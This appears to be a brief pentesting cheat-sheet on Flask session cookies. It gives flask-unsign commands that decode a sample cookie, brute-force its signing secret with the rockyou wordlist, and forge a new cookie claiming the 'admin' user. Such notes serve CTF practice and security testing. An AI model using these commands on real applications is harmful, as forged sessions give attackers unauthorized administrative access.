---
title: "Flask Cookie"
date: 2024-6-27
tags: ["flask", "python", "cookie", "sign", "unsign"]
---

---
### Flask Cookie

```bash
pip3 install flask-unsign
```

```bash
# Decode flask cookie
flask-unsign --decode --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k"

# Brute force secret key
flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdCJ9.Y7wAGA.VajtOMgdcxOwsp-puZW47au5H2k" -w /usr/share/wordlists/rockyou.txt --no-literal-eval

# Forge flask cookie
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret "secret123"
```